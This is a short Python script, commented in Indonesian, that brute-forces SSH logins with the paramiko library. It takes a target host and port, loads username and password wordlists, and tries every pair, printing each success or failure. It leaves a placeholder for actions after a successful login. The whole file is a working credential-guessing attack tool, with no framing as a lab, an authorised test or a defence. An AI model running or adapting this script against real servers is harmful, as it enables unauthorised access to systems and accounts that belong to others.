import paramiko

# Konfigurasi host SSH
alamat_host = input("Masukkan alamat host SSH: ")
port_ssh = int(input("Masukkan port SSH: "))

# Baca file wordlist username
file_username = input("Masukkan nama file wordlist username: ")
with open(file_username, "r") as file:
    daftar_username = file.read().splitlines()

# Baca file wordlist password
file_password = input("Masukkan nama file wordlist password: ")
with open(file_password, "r") as file:
    daftar_password = file.read().splitlines()

# Coba setiap kombinasi username dan password
for username in daftar_username:
    for password in daftar_password:
        try:
            # Buat koneksi SSH
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(alamat_host, port_ssh, username, password)

            # Jika berhasil login, tampilkan pesan sukses
            print(f"Login berhasil - Host: {alamat_host}, Username: {username}, Password: {password}")

            # Lakukan tindakan setelah login sukses
            # ...

            # Tutup koneksi SSH
            client.close()

        except paramiko.AuthenticationException:
            # Jika gagal login, tampilkan pesan gagal
            print(f"Gagal login - Host: {alamat_host}, Username: {username}, Password: {password}")
